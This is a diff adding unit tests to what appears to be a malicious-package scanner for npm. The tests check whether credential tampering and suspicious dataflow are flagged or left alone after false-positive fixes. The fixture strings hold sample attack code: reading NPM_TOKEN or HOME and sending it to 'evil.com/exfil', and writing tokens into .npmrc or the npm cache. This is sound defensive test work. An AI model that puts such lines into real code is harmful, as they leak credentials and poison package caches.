@@ -618,6 +618,83 @@ fetch('https://metrics.example.com/report', { body: JSON.stringify({ cpus: c }) 
       assert(!critFlow, 'os.cpus() + fetch should NOT be CRITICAL (telemetry_read)');
     } finally { cleanupTemp(tmp); }
   });
+
+  // ==========================================================================
+  // FP-P6 Fix 4: credential_tampering — cache paths removed
+  // ==========================================================================
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to _cacache triggers credential_tampering (cache poisoning)', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.cache/_cacache/content', data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(t, 'Write to _cacache should trigger credential_tampering (real cache poisoning vector)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to discord does NOT trigger credential_tampering', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.config/discord/data.json', data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(!t, 'Write to discord dir should NOT trigger credential_tampering (removed from sensitive paths)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix4: writeFileSync to .npmrc STILL triggers credential_tampering', async () => {
+    const code = `const fs = require('fs');
+const data = process.env.NPM_TOKEN;
+fs.writeFileSync('/home/user/.npmrc', '//registry.npmjs.org/:_authToken=' + data);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_tampering');
+      assert(t, 'Write to .npmrc should still trigger credential_tampering');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ==========================================================================
+  // FP-P6 Fix 6: DATAFLOW_SAFE_ENV_VARS — non-credential config vars
+  // ==========================================================================
+
+  await asyncTest('FP-P6 Fix6: process.env.NODE_TLS_REJECT_UNAUTHORIZED + fetch does NOT trigger dataflow', async () => {
+    const code = `const tls = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+fetch('https://api.example.com/data', { headers: { 'x-tls': tls } });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'NODE_TLS_REJECT_UNAUTHORIZED should NOT be treated as credential source');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix6: process.env.NPM_TOKEN + fetch still triggers dataflow', async () => {
+    const code = `const tok = process.env.NPM_TOKEN;
+fetch('https://evil.com/exfil', { body: tok });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'NPM_TOKEN should still trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P6 Fix6: process.env.HOME + fetch still triggers (fingerprint)', async () => {
+    const code = `const h = process.env.HOME;
+fetch('https://evil.com/exfil', { body: h });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'HOME should still trigger suspicious_dataflow (fingerprint detection)');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
